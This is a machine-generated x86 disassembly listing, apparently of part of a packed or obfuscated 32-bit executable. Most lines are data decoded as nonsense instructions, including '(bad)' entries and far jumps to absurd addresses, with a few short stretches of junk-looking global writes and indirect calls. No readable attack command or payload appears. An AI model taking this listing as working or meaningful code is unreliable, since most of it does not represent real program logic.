  402a71:	sub    al,BYTE PTR [edx-0x5c]
  402a74:	das    
  402a75:	test   DWORD PTR [edi+0x11],edx
  402a78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a79:	clc    
  402a7a:	dec    ebp
  402a7b:	mov    WORD PTR [eax-0x53],es
  402a7e:	sbb    edx,0x6f4803c6
  402a84:	push   edi
  402a85:	mov    ecx,0xb88c7fcf
  402a8a:	and    cl,BYTE PTR [esi+ecx*2]
  402a8d:	cmp    al,0x29
  402a8f:	inc    esi
  402a90:	loope  0x402ad0
  402a92:	cld    
  402a93:	clc    
  402a94:	in     al,0x62
  402a96:	(bad)  
  402a97:	or     al,0x5a
  402a99:	adc    dh,ch
  402a9b:	adc    eax,0xfa7a3376
  402aa0:	jmp    0xbda7:0x1d29aa02
  402aa7:	sar    dl,0x6e
  402aaa:	inc    esi
  402aab:	or     ebx,ecx
  402aad:	test   ebx,ebx
  402aaf:	imul   edi,esi,0x961f7c8c
  402ab5:	es in  eax,0x1c
  402ab8:	and    bh,BYTE PTR [eax-0x1bcee754]
  402abe:	xchg   ebp,eax
  402abf:	sbb    al,ch
  402ac1:	jo     0x402a81
  402ac3:	xor    ebx,DWORD PTR [eax]
  402ac5:	mov    dl,0xa0
  402ac7:	fwait
  402ac8:	stos   BYTE PTR es:[edi],al
  402ac9:	fistp  WORD PTR [esi+ecx*4+0x38]
  402acd:	popf   
  402ace:	mov    cl,0x85
  402ad0:	xchg   ebp,eax
  402ad1:	xor    eax,0xb279b095
  402ad6:	xchg   ebx,eax
  402ad7:	(bad)  
  402ad8:	cmc    
  402ad9:	mov    al,0xe6
  402adb:	cmc    
  402adc:	sbb    DWORD PTR [edi],ecx
  402ade:	inc    esp
  402adf:	xchg   esp,eax
  402ae0:	jl     0x402a78
  402ae2:	(bad)
  402ae5:	mov    ds:0xa0cf86a7,eax
  402aea:	adc    al,0xe5
  402aec:	jg     0x402b3b
  402aee:	jo     0x402af6
  402af0:	push   esp
  402af1:	int    0x9b
  402af3:	jecxz  0x402b50
  402af5:	mov    ebp,0x19a809eb
  402afa:	popa   
  402afb:	xchg   DWORD PTR [edx+0x9544324],edx
  402b01:	std    
  402b02:	sub    dh,BYTE PTR [ebp-0x60105c02]
  402b08:	jmp    0x7c24:0xba0048c7
  402b0f:	push   edi
  402b10:	mov    BYTE PTR [esi-0xc],ch
  402b13:	loop   0x402b70
  402b15:	push   cs
  402b16:	call   0x94891a67
  402b1b:	pop    ds
  402b1c:	outs   dx,BYTE PTR ds:[esi]
  402b1d:	mov    esi,0xb20a3a45
  402b22:	rcl    BYTE PTR [edi],1
  402b24:	mov    edx,DWORD PTR [ecx]
  402b26:	imul   edx,DWORD PTR [edx-0x51553203],0x36
  402b2d:	mov    ah,0xd
  402b30:	scas   eax,DWORD PTR es:[edi]
  402b31:	enter  0xba7d,0x5b
  402b35:	pop    ebp
  402b36:	in     eax,dx
  402b37:	imul   eax,DWORD PTR [esi+esi*1],0x30df08ed
  402b3e:	imul   edx,DWORD PTR [ecx],0xdcd4daea
  402b44:	sbb    esp,ebx
  402b46:	clc    
  402b47:	ins    DWORD PTR es:[edi],dx
  402b48:	mov    ss,WORD PTR [ebp-0x69]
  402b4b:	enter  0x3519,0x33
  402b4f:	ret    
  402b50:	inc    ecx
  402b51:	pop    es
  402b52:	mov    edx,?
  402b54:	xchg   ecx,eax
  402b55:	push   ecx
  402b56:	repnz es cld 
  402b59:	dec    edx
  402b5a:	xchg   esi,eax
  402b5b:	inc    esp
  402b5c:	mov    bh,0xbc
  402b5e:	mov    DWORD PTR [eax+0x77],ebp
  402b61:	pop    ss
  402b62:	mov    dl,0x7a
  402b64:	pop    ss
  402b65:	mov    edi,0xfd254c28
  402b6a:	push   ecx
  402b6b:	push   eax
  402b6c:	push   0xddf
  402b71:	sbb    DWORD PTR ds:0x428377,0x41e0
  402b7b:	push   0x2d0f
  402b80:	call   0x422046
  402b85:	mov    ecx,DWORD PTR [ebp-0x68]
  402b88:	not    edx
  402b8a:	mov    edx,DWORD PTR [ebp-0x64]
  402b8d:	cmp    DWORD PTR ds:0x428263,0x0
  402b94:	mov    edx,DWORD PTR ds:0x428377
  402b9a:	mov    DWORD PTR ds:0x42816f,0x2873
  402ba4:	movzx  edx,WORD PTR ds:0x428213
  402bab:	jmp    0x402c06
  402bb0:	mov    DWORD PTR ds:0x4282eb,ebx
  402bb6:	cmp    DWORD PTR ds:0x428263,0x0
  402bbd:	jb     0x402be8
  402bc3:	push   DWORD PTR [ebp-0x1c]
  402bc6:	call   DWORD PTR ds:0x428d64
  402bcc:	mov    edx,DWORD PTR ds:0x428273
  402bd2:	add    DWORD PTR ds:0x42824b,edx
  402bd8:	mov    DWORD PTR ds:0x4282ef,0x7648
  402be2:	adc    edx,DWORD PTR ds:0x42822b
  402be8:	mov    edx,DWORD PTR ds:0x4282fb
  402bee:	sbb    DWORD PTR ds:0x428287,edx
  402bf4:	mov    edx,DWORD PTR ds:0x428243
  402bfa:	xor    DWORD PTR ds:0x428307,edx
  402c00:	and    edx,DWORD PTR ds:0x4282df
  402c06:	xor    eax,ecx
  402c08:	mov    ecx,DWORD PTR [ebp-0x70]
  402c0b:	xor    edx,0x594e
  402c11:	mov    edx,DWORD PTR [ebp-0x6c]
  402c14:	add    DWORD PTR ds:0x42820b,0x7b5b
  402c1e:	sub    eax,ecx
  402c20:	mov    ecx,DWORD PTR ds:0x4281b3
  402c26:	mov    ecx,DWORD PTR [ecx]
  402c28:	and    DWORD PTR ds:0x42823b,ecx
  402c2e:	mov    ecx,DWORD PTR ds:0x422568
  402c34:	or     DWORD PTR ds:0x428133,0x509d
  402c3e:	lea    eax,[eax+ecx*1-0x27d2]
  402c45:	mov    ecx,DWORD PTR [ebp-0x1c]
  402c48:	mov    edx,DWORD PTR [ebp-0x2c]
  402c4b:	sbb    DWORD PTR ds:0x4282db,0x9f0
  402c55:	or     ecx,0x4f00
  402c5b:	add    DWORD PTR ds:0x42836f,0x42834b
  402c65:	jmp    0x403043
  402c6a:	nop
  402c6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c6c:	(bad)  
  402c6d:	call   0x1caec68c
  402c72:	int    0x3e
  402c74:	cmp    DWORD PTR [eax+eax*8+0x28],0xe
  402c79:	jle    0x402c31
  402c7b:	hlt    
  402c7c:	sbb    BYTE PTR [eax],bl
  402c7e:	sahf   
  402c7f:	adc    bl,BYTE PTR [eax]
  402c81:	sbb    bh,bl
  402c83:	and    esi,esi
  402c85:	stc    
  402c86:	xor    BYTE PTR [edx-0x6a],ah
  402c89:	sub    DWORD PTR [esi],esp
  402c8b:	add    BYTE PTR [edi-0x53],cl
  402c8e:	into   
  402c8f:	cwde   
  402c90:	or     al,0x38
  402c92:	sub    eax,ebp
  402c94:	fild   QWORD PTR [ecx+ecx*4+0x7b764109]
  402c9b:	sbb    BYTE PTR [eax+ebp*2-0x21],dh
  402c9f:	cmp    DWORD PTR [ebx-0x4],0xcca31f1c
  402ca6:	xchg   DWORD PTR [ebx],edi
  402ca8:	xchg   edi,eax
  402ca9:	jle    0x402c81
  402cab:	push   ebx
  402cac:	cmp    BYTE PTR [edi],ch
  402cae:	or     ebp,DWORD PTR [edx+0x630ffcea]
  402cb4:	mov    ds:0x642cad6f,al
  402cb9:	mov    cl,0x7f
  402cbb:	sub    esp,eax
  402cbd:	fld    TBYTE PTR [ebp+0x4f5ab811]
  402cc3:	(bad)
  402cc7:	xchg   ebp,eax
  402cc8:	jecxz  0x402ce2
  402cca:	jb     0x402cd2
  402ccc:	push   ebx
  402ccd:	push   ss
  402cce:	daa    
  402ccf:	loope  0x402cf4
  402cd1:	repz mov esp,0xda48f57d
  402cd7:	xchg   edi,eax
  402cd8:	push   esi
  402cd9:	inc    ebp
  402cda:	call   0xc0dd01e9
  402cdf:	cld    
  402ce0:	and    BYTE PTR [eax],dh
  402ce2:	mov    cl,0x8a
  402ce4:	inc    edi
  402ce5:	loop   0x402c72
  402ce7:	in     eax,dx
  402ce8:	neg    DWORD PTR [eax-0xc]
  402ceb:	dec    ecx
  402cec:	xor    DWORD PTR [ebp-0x64be3491],eax
  402cf2:	pusha  
  402cf3:	xor    ch,BYTE PTR [edi+ebx*4-0x5e]
  402cf7:	aas    
  402cf8:	fnstcw WORD PTR [ebx+eiz*2]
  402cfb:	repnz sar DWORD PTR [esi-0x495574f7],1
  402d02:	mov    al,0x93
  402d04:	mov    cr7,ebp
  402d07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d08:	nop
  402d09:	adc    DWORD PTR [ecx+0x4d],ecx
  402d0c:	sbb    al,dl
  402d0e:	enter  0xca5f,0xfb
  402d12:	repz or edx,DWORD PTR [ecx]
  402d15:	pop    ds
  402d16:	jg     0x402d07
  402d18:	test   al,0xf1
  402d1a:	mov    bh,0xc6
  402d1c:	or     ah,al
  402d1e:	or     bh,BYTE PTR [si-0x2b48]
  402d23:	and    eax,0xb3c613a2
  402d28:	sbb    DWORD PTR [eax-0x120a5914],ecx
  402d2e:	mov    ch,dh
  402d30:	push   ecx
  402d31:	jmp    0x5edb4df6
  402d36:	sub    eax,0x92d2b93c
  402d3b:	add    al,0x96
  402d3d:	jge    0x402d56
  402d3f:	daa    
  402d40:	sti    
  402d41:	and    eax,0x38e923a
  402d46:	mov    es,WORD PTR [edi+0x4c]
  402d49:	stc    
  402d4a:	mov    WORD PTR [ebx-0x18f3672d],?
  402d50:	jecxz  0x402cd9
  402d52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d53:	scas   eax,DWORD PTR es:[edi]
  402d54:	mov    edi,0xbd31196e
  402d59:	sar    DWORD PTR [ecx+edi*1+0x45],0x0
  402d5e:	lods   eax,DWORD PTR ds:[esi]
  402d5f:	inc    esi
  402d60:	loope  0x402de0
  402d62:	aas    
  402d63:	jmp    FWORD PTR [edx-0x66]
  402d66:	inc    esi
  402d67:	mov    esi,0x1d0d8d54
  402d6c:	icebp  
  402d6d:	inc    eax
  402d6e:	inc    esi
  402d6f:	add    edx,ebp
  402d71:	dec    edi
  402d72:	inc    eax
  402d73:	inc    ebx
  402d74:	add    eax,0xbee1056
  402d79:	mov    esi,0xcd7cb435
  402d7e:	or     BYTE PTR [eax+0x8500a94],bl
  402d84:	ror    DWORD PTR [esi],cl
  402d86:	mov    eax,ds:0x13cf4570
  402d8b:	xlat   BYTE PTR ds:[ebx]
  402d8c:	mov    WORD PTR [edi+0x71],fs
  402d8f:	add    ebx,ebp
  402d91:	iret   
  402d92:	in     al,dx
  402d93:	fdivr  QWORD PTR [edx]
  402d95:	adc    dl,BYTE PTR [edx-0x7d]
  402d98:	lahf   
  402d99:	xchg   edx,eax
  402d9a:	fadd   DWORD PTR [ebp+0x1]
  402d9d:	aad    0x57
  402d9f:	xor    ebx,DWORD PTR [esi-0x1d64a7c4]
  402da5:	mov    cl,0x80
  402da7:	(bad)  
  402da8:	out    0x13,al
  402daa:	test   DWORD PTR [ebx-0x2117aed7],ebx
  402db0:	js     0x402dc1
  402db2:	sbb    edi,esi
  402db4:	stc    
  402db5:	push   edi
  402db6:	pop    edi
  402db7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402db8:	retf   
  402db9:	push   esp
  402dba:	or     bl,ch
  402dbc:	pop    edx
  402dbd:	(bad)  
  402dbe:	ret    0xbc6f
  402dc1:	lock (bad) 
  402dc3:	push   0xefc57796
  402dc8:	push   edx
  402dc9:	xchg   dl,ch
  402dcb:	test   BYTE PTR [eax+0x68],0x78
  402dcf:	(bad)  
  402dd0:	and    bh,ch
  402dd2:	jns    0x402d7a
  402dd4:	and    BYTE PTR [eax+0x6c],0xda
  402dd8:	add    al,0x15
  402dda:	adc    edi,DWORD PTR [ecx+0x36]
  402ddd:	or     al,0x15
  402ddf:	gs ds pop esi
  402de2:	ja     0x402dee
  402de4:	cmp    esi,DWORD PTR [esi]
  402de6:	jge    0x402dac
  402de8:	test   BYTE PTR [eax-0x70d10633],dh
  402dee:	dec    eax
  402def:	fbstp  TBYTE PTR [edi+0x1b3966dd]
  402df5:	pop    ds
  402df6:	repz stc 
  402df8:	add    DWORD PTR [ecx+0x62],ebx
  402dfb:	(bad)  
  402dfc:	pop    ecx
  402dfd:	and    esi,DWORD PTR [ebx]
  402dff:	lahf   
  402e00:	and    bh,BYTE PTR [ecx+0x33d595ea]
  402e06:	bound  ecx,QWORD PTR [edi+0x4349b48b]
  402e0c:	inc    edi
  402e0d:	pop    ds
  402e0e:	aaa    
  402e0f:	dec    ebp
  402e10:	xchg   esp,eax
  402e11:	mov    bl,0x59
  402e13:	xor    al,0xde
  402e15:	cmp    ah,ah
  402e17:	push   edi
  402e18:	dec    edi
  402e19:	xchg   DWORD PTR [ecx-0x4114114e],esp
  402e1f:	push   cs
  402e20:	push   esi
  402e21:	jnp    0x402e6c
  402e23:	ins    BYTE PTR es:[edi],dx
  402e24:	fist   WORD PTR ds:[ebp+0x7456c207]
  402e2b:	xchg   edi,eax
  402e2c:	inc    eax
  402e2d:	dec    edi
  402e2e:	add    al,0x20
  402e30:	jg     0x402e2f
  402e32:	in     eax,0xe0
  402e34:	enter  0xe78c,0x6d
  402e38:	popf   
  402e39:	push   ss
  402e3a:	push   esp
  402e3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e3c:	fxch   st(2)
  402e3e:	pop    ss
  402e3f:	bound  ebp,QWORD PTR [eax-0x1d]
  402e42:	add    al,0x26
  402e44:	inc    esi
  402e45:	and    BYTE PTR [eax+edi*8+0x2f],bl
  402e49:	icebp  
  402e4a:	out    0xd3,eax
  402e4c:	jge    0x402e9b
  402e4e:	cmp    ah,BYTE PTR [edi+0x27]
  402e51:	mov    bh,0xcb
  402e53:	inc    edx
  402e54:	sub    bh,BYTE PTR [esi]
  402e56:	xlat   BYTE PTR ds:[ebx]
  402e57:	push   ds
  402e58:	adc    BYTE PTR [ebp-0x5a],0x31
  402e5c:	inc    ecx
  402e5d:	mov    ebp,0x8714ba1f
  402e62:	xor    eax,0x9dfe5535
  402e67:	jbe    0x402ee6
  402e69:	or     esp,DWORD PTR [ebx]
  402e6b:	aam    0x4
  402e6d:	adc    cl,BYTE PTR [edi+0x79]
  402e70:	fwait
  402e71:	mov    WORD PTR [eax-0x2],?
  402e74:	xchg   BYTE PTR [eax],bl
  402e76:	mov    dh,0x86
  402e78:	rcl    BYTE PTR [ebp+0x74],0x2e
  402e7c:	retf   0xf1e4
  402e7f:	inc    eax
  402e80:	pop    edi
  402e81:	sbb    BYTE PTR [ecx-0x30],dh
  402e84:	dec    esp
  402e85:	shl    BYTE PTR [ebp-0x79],0x6
  402e89:	sahf   
  402e8a:	lods   eax,DWORD PTR ds:[esi]
  402e8b:	xchg   edx,eax
  402e8c:	fsubr  DWORD PTR [ebx]
  402e8e:	and    esp,DWORD PTR [ebp*1-0x74f58d00]
  402e95:	push   esi
  402e96:	stos   BYTE PTR es:[edi],al
  402e97:	call   0xa156:0xc5ffaf24
  402e9e:	xor    DWORD PTR [edx-0x5b2d3d70],ebx
  402ea4:	lock inc eax
  402ea6:	scas   eax,DWORD PTR es:[edi]
  402ea7:	jnp    0x402f00
  402ea9:	sbb    eax,0xeeab921
  402eae:	(bad)  
  402eaf:	outs   dx,BYTE PTR ds:[esi]
  402eb0:	into   
  402eb1:	or     ebp,DWORD PTR [edx-0x67]
  402eb4:	xchg   ebp,eax
  402eb5:	mov    edx,0x5b7a39d4
  402eba:	int    0xfc
  402ebc:	and    BYTE PTR [edi],bl
  402ebe:	mov    al,ds:0xb66efb9a
  402ec3:	gs repz and ebp,0x40
  402ec8:	sub    DWORD PTR [eax-0x1f43a87d],esi
  402ece:	iret   
  402ecf:	dec    ebp
  402ed0:	xor    BYTE PTR [ecx+0x62],0x11
  402ed4:	xchg   esi,eax
  402ed5:	dec    ebx
  402ed6:	lahf   
  402ed7:	mov    edi,0xc2ac061c
  402edc:	mov    cl,0x98
  402ede:	fs mov al,0x83
  402ee1:	rcr    BYTE PTR [ebp+0x6d],cl
  402ee4:	stc    
  402ee5:	scas   eax,DWORD PTR es:[edi]
  402ee6:	mov    al,0xbe
  402ee8:	rol    esp,cl
  402eea:	(bad)  
  402eeb:	popf   
  402eec:	lods   al,BYTE PTR ds:[esi]
  402eed:	out    dx,al
  402eee:	shl    BYTE PTR ds:0xa3947910,0xc2
  402ef5:	xor    BYTE PTR [edx-0xb7a5135],cl
  402efb:	(bad)  
  402efd:	pop    ebp
  402efe:	loopne 0x402ecb
  402f00:	or     eax,0xaa4890b7
  402f05:	loop   0x402f4e
  402f07:	sub    ch,BYTE PTR [esi+0x3]
  402f0a:	stos   BYTE PTR es:[edi],al
  402f0b:	(bad)  
  402f0c:	jle    0x402f00
  402f0e:	and    eax,DWORD PTR [eax]
  402f10:	mov    db2,esp
  402f13:	rcr    DWORD PTR [ebx+0x17a565c2],cl
  402f19:	add    bl,dl
  402f1b:	sbb    al,0x24
  402f1d:	das    
  402f1e:	aam    0x2f
  402f20:	fdiv   st,st(4)
  402f22:	xlat   BYTE PTR ds:[ebx]
  402f23:	pcmpeqb mm3,QWORD PTR [eax+0x27424ed3]
  402f2a:	jmp    0x1be:0xd6a38103
  402f31:	fs push esp
  402f33:	aam    0x2f
  402f35:	adc    edx,DWORD PTR [eax-0x2e]
  402f38:	dec    esi
  402f39:	sbb    eax,0x28d66ce0
  402f3e:	adc    ebx,DWORD PTR [edi]
  402f40:	mov    BYTE PTR [eax-0x72e529a1],al
  402f46:	and    DWORD PTR [edi+0x4a8a393e],ebx
  402f4c:	sub    DWORD PTR [ebp-0x749f892e],esi
  402f52:	je     0x402f26
  402f54:	xor    cl,dl
  402f56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f57:	fbld   TBYTE PTR [edi+0x62a17d4d]
  402f5d:	ret    
  402f5e:	dec    ebx
  402f5f:	ror    DWORD PTR [ecx],0x9b
  402f62:	scas   al,BYTE PTR es:[edi]
  402f63:	arpl   WORD PTR [edx+0x65771f4f],bp
  402f69:	fst    st(3)
  402f6b:	iret   
  402f6c:	retf   0x5258
  402f6f:	outs   dx,BYTE PTR es:[esi]
  402f71:	lods   al,BYTE PTR ds:[esi]
  402f72:	and    esp,DWORD PTR [ebx]
  402f74:	into   
  402f75:	mov    edi,eax
  402f77:	jle    0x402fde
  402f79:	dec    edi
  402f7a:	push   eax
  402f7b:	out    dx,al
  402f7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f7d:	cmp    bh,BYTE PTR [ebx+0x2]
  402f80:	loop   0x402f9d
  402f82:	and    eax,0xa988120b
  402f87:	mov    ch,0xf8
  402f89:	int    0xa2
  402f8b:	and    BYTE PTR [eax+0x3d],ch
  402f8e:	mov    esi,0x6c3307b3
  402f93:	sbb    eax,DWORD PTR [esi]
  402f95:	mov    cl,0xd8
  402f97:	pop    esi
  402f99:	or     dl,BYTE PTR [edx]
  402f9b:	push   0x12
  402f9d:	xor    ecx,DWORD PTR [ecx-0x1d]
  402fa0:	mov    al,0x37
  402fa2:	call   FWORD PTR [edi]
  402fa4:	sbb    al,0xf0
  402fa6:	adc    DWORD PTR [edi+0x227ec775],edx
  402fac:	test   al,0xff
  402fae:	inc    eax
  402faf:	adc    DWORD PTR [esp+ebx*8],ebx
  402fb2:	push   ebp
  402fb3:	sar    DWORD PTR [esi-0x4c],cl
  402fb6:	mov    dl,0x2e
  402fb8:	or     DWORD PTR [ebp-0x4123b85a],edx
  402fbe:	push   ecx
  402fbf:	mov    bh,dh
  402fc1:	cmp    DWORD PTR [edi],0x45
  402fc4:	jg     0x402fae
  402fc6:	sbb    esi,0x17
  402fc9:	sub    ebp,edi
  402fcb:	bound  edx,QWORD PTR [edi]
  402fcd:	(bad)  
  402fce:	jge    0x40303c
  402fd0:	add    DWORD PTR [edi],eax
  402fd2:	data16 repz adc BYTE PTR [eax+0x7a],ah
  402fd7:	sahf   
  402fd8:	dec    ebx
  402fd9:	xor    esp,DWORD PTR [edi]
  402fdb:	add    BYTE PTR [edx],dh
  402fdd:	iret   
  402fde:	mov    cl,0xf9
  402fe0:	nop
  402fe1:	imul   eax,DWORD PTR [eax+edi*2-0x1bb76efc],0x5f
  402fe9:	add    al,al
  402feb:	inc    esp
  402fec:	retf   0xbac9
  402fef:	xchg   ecx,eax
  402ff0:	pop    ss
  402ff1:	xchg   esi,eax
  402ff2:	xchg   ebx,eax
  402ff3:	scas   al,BYTE PTR es:[edi]
  402ff4:	adc    ebx,DWORD PTR [eax+edx*4+0x6b3b3fc5]
  402ffb:	fcmovb st,st(2)
  402ffd:	addr16 (bad) 
  402fff:	lods   eax,DWORD PTR ds:[esi]
  403000:	sub    ecx,ebp
  403002:	dec    esp
  403003:	dec    ebx
  403004:	(bad)  
  403005:	and    DWORD PTR [ecx+0x76],ebx
  403008:	dec    ecx
  403009:	dec    esp
  40300a:	lea    ebp,[eax+0x55]
  40300d:	adc    ebx,ebx
  40300f:	cmp    BYTE PTR [eax+0x4a],cl
  403012:	push   ds
  403013:	gs push ds
  403015:	dec    ebp
  403016:	ins    BYTE PTR es:[edi],dx
  403017:	pusha  
  403018:	repz inc esi
  40301a:	fs pop ds
  40301c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40301d:	scas   al,BYTE PTR es:[edi]
  40301e:	pop    ebp
  40301f:	mov    al,BYTE PTR ds:0xd277328e
  403025:	ds mov ebp,0xa546b3ea
  40302b:	adc    eax,0xcf52bba
  403030:	lods   eax,DWORD PTR ds:[esi]
  403031:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403032:	push   ss
  403033:	push   cs
  403034:	add    eax,0xd31c82c7
  403039:	sbb    BYTE PTR [ebp+edx*8-0xe292e16],0xa6
  403041:	retf   
  403042:	inc    eax
  403043:	and    ecx,edx
  403045:	add    edx,0x3463
  40304b:	mov    edx,DWORD PTR [ebp-0x34]
  40304e:	or     ecx,edx
  403050:	xor    ecx,0x5fdd
  403056:	cmp    ecx,DWORD PTR [eax]
  403058:	mov    DWORD PTR ds:0x42827b,0x665d
  403062:	jne    0x40a9b0
  403068:	mov    ecx,DWORD PTR [esi]
  40306a:	cmp    DWORD PTR ds:0x42837f,0x0
  403071:	mov    DWORD PTR ds:0x428383,edx
  403077:	mov    DWORD PTR ds:0x4282cb,0x1413
  403081:	mov    edx,DWORD PTR ds:0x428373
  403087:	jmp    0x4030db
  40308c:	mov    DWORD PTR ds:0x42813f,0x4beb
  403096:	not    eax
  403098:	cmp    DWORD PTR ds:0x42837f,0x0
  40309f:	jl     0x4030c1
  4030a5:	push   DWORD PTR [ebp-0x20]
  4030a8:	push   DWORD PTR [ebp-0xc]
  4030ab:	call   DWORD PTR ds:0x428d84
  4030b1:	mov    DWORD PTR ds:0x42822b,0x4e29
  4030bb:	inc    DWORD PTR ds:0x42824f
  4030c1:	or     edx,DWORD PTR ds:0x4282eb
  4030c7:	add    edx,DWORD PTR ds:0x42816f
  4030cd:	sub    edx,edx
  4030cf:	add    DWORD PTR ds:0x428377,edx
  4030d5:	sbb    edx,DWORD PTR ds:0x4282ff
  4030db:	mov    eax,DWORD PTR [esi+0x4]
  4030de:	sbb    edx,DWORD PTR ds:0x428363
  4030e4:	shrd   ecx,eax,0x2
  4030e8:	shr    eax,0x2
  4030eb:	mov    eax,DWORD PTR [esi]
  4030ed:	xor    DWORD PTR ds:0x428383,edx
  4030f3:	mov    edx,DWORD PTR [esi+0x4]
  4030f6:	neg    DWORD PTR ds:0x42813b
  4030fc:	shl    eax,0x1e
  4030ff:	xor    ecx,edi
  403101:	xor    eax,eax
  403103:	sbb    DWORD PTR ds:0x428387,0x1e67
  40310d:	or     eax,ecx
  40310f:	jmp    0x4034ed
  403114:	and    al,0xd6
  403116:	push   esp
  403117:	repnz and dh,BYTE PTR [ebx+0x22]
  40311b:	inc    esi
  40311c:	sar    BYTE PTR [eax-0x73],1
  40311f:	jo     0x403119
  403121:	push   ds
  403122:	sub    eax,0x18ec3dbe
  403127:	sbb    BYTE PTR [esi+0x40181812],bl
  40312d:	inc    ebp
  40312e:	pop    esi
  40312f:	neg    BYTE PTR [ebx]
  403131:	or     al,0x79
  403133:	sbb    BYTE PTR [ecx+eiz*8],0x42
  403137:	pop    ss
  403138:	psraw  mm3,QWORD PTR [edx]
  40313b:	dec    edi
  40313c:	or     eax,0xaa048288
  403141:	out    0x64,eax
  403143:	or     al,0xc8
  403145:	test   BYTE PTR [edx+ebx*4],dl
  403148:	hlt    
  403149:	addr16 xchg ecx,eax
  40314b:	and    eax,0xd29aaf58
  403150:	lods   eax,DWORD PTR ds:[esi]
  403151:	(bad)  
  403152:	jl     0x4030f4
  403154:	cmp    BYTE PTR [ebp-0x63],bl
  403157:	add    ax,0x6426
  40315b:	add    DWORD PTR [ebx+eax*4+0x6c],ecx
  40315f:	sub    al,0x4f
  403161:	sub    ebp,ecx
  403163:	sbb    eax,0x3bf9513b
  403168:	pop    ds
  403169:	repnz nop
  40316b:	div    BYTE PTR [edx]
  40316d:	mov    ch,0xdc
  40316f:	adc    esi,DWORD PTR [edi-0x1d1eaad6]
  403175:	mov    cl,0x2
  403177:	cmp    DWORD PTR [ecx+edi*2],ebp
  40317a:	pop    eax
  40317b:	cmp    bh,BYTE PTR [eax-0x1a]
  40317e:	jbe    0x403131
  403180:	xchg   edi,eax
  403181:	loop   0x4031ff
  403183:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403184:	adc    ah,BYTE PTR [ecx-0x48]
  403187:	enter  0x7192,0x5d
  40318b:	std    
  40318c:	popa   
  40318d:	cs mov bh,0x15
  403190:	jbe    0x40314d
  403192:	sub    eax,0x6bdee5a4
  403197:	adc    BYTE PTR [eax+0x66],0xe2
  40319b:	adc    bh,bl
  40319d:	gs aad 0x98
  4031a0:	sbb    BYTE PTR [edi-0x16ec0e66],bh
  4031a6:	dec    DWORD PTR [ebx-0x76]
  4031a9:	jb     0x4031ce
  4031ab:	and    eax,0x18d39a24
  4031b0:	fidivr WORD PTR [ecx-0x4587e875]
  4031b6:	pusha  
  4031b7:	jns    0x403219
  4031b9:	and    BYTE PTR [esi],bh
  4031bb:	icebp  
  4031bc:	jecxz  0x403186
  4031be:	push   esp
  4031bf:	add    esp,ebx
  4031c1:	(bad)  
  4031c2:	cld    
  4031c3:	jp     0x403200
  4031c5:	mov    al,ds:0x8a7e4040
  4031ca:	int    0xa4
  4031cc:	iret   
  4031cd:	test   DWORD PTR [esi+0xd09f73],esp
  4031d3:	dec    esi
  4031d4:	add    al,0x39
  4031d6:	xchg   ebx,eax
  4031d7:	aad    0x55
  4031d9:	lods   eax,DWORD PTR ds:[esi]
  4031da:	sub    cl,dl
  4031dc:	push   cs
  4031dd:	jo     0x403209
  4031df:	adc    ah,cl
  4031e1:	pop    esi
  4031e2:	ret    0xc5e
  4031e5:	push   0x2cd28c66
  4031ea:	dec    edx
  4031eb:	xor    eax,0x4d905d37
  4031f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031f2:	test   BYTE PTR [ebx-0x77],bh
  4031f5:	stos   BYTE PTR es:[edi],al
  4031f6:	test   BYTE PTR [ecx+edx*1-0x456481a3],ah
  4031fd:	enter  0x20,0xd8
  403201:	mov    al,0x9d
  403203:	stc    
  403204:	fimul  WORD PTR [ebx]
  403206:	repnz out 0x1a,al
  403209:	mov    ch,0x80
  40320b:	ins    DWORD PTR es:[edi],dx
  40320c:	fild   WORD PTR [edi]
  40320e:	add    eax,0x2136bbf4
  403213:	mov    esi,0xf5e9851d
  403218:	scas   eax,DWORD PTR es:[edi]
  403219:	xchg   edi,eax
  40321a:	cmp    BYTE PTR [edi+0x63],0x3a
  40321e:	jg     0x403293
  403220:	loopne 0x403253
  403222:	neg    BYTE PTR es:[eax-0x16]
  403226:	pusha  
  403227:	sub    eax,0x46a3e850
  40322c:	nop
  40322d:	cmc    
  40322e:	stos   DWORD PTR es:[edi],eax
  40322f:	and    BYTE PTR [ecx+0x38ba2399],0x62
  403236:	in     al,dx
  403237:	call   0x1b24:0x37a864eb
  40323e:	(bad)  
  40323f:	das    
  403240:	out    dx,eax
  403241:	stc    
  403242:	nop
  403243:	xchg   ebx,eax
  403244:	mov    BYTE PTR [ebx+ebp*1+0x3375de1d],ah
  40324b:	push   cs
  40324c:	scas   eax,DWORD PTR es:[edi]
  40324d:	mov    ds:0x92c2f9d,al
  403252:	pop    eax
  403253:	push   ebp
  403254:	pushf  
  403255:	dec    ebx
  403256:	push   edx
  403257:	sbb    bl,BYTE PTR [edx-0x30551a4f]
  40325d:	or     eax,0xd9a6c02d
  403262:	add    dl,BYTE PTR [ebp+0x60]
  403265:	sub    edx,DWORD PTR [edi-0x51]
  403268:	fiadd  WORD PTR [ecx-0x32]
  40326b:	(bad)  
  40326d:	push   ebx
  40326e:	nop
  40326f:	adc    dl,BYTE PTR [ecx+ecx*2-0x6bf7593e]
  403276:	mov    BYTE PTR ds:0x502e2875,0xea
  40327d:	adc    al,0x72
  40327f:	lods   al,BYTE PTR ds:[esi]
  403280:	mov    al,ds:0xc4ff3bb2
  403285:	add    eax,0x71ce1f3b
  40328a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40328b:	push   esi
  40328d:	idiv   BYTE PTR [ecx]
  40328f:	jge    0x4032a4
  403291:	cwde   
  403292:	inc    ecx
  403293:	mov    ecx,edi
  403295:	mov    ds:0x879d9c18,eax
  40329a:	xchg   ecx,eax
  40329b:	jle    0x403234
  40329d:	push   ds
  40329e:	cmp    ecx,ebx
  4032a0:	stos   DWORD PTR es:[edi],eax
  4032a1:	dec    edi
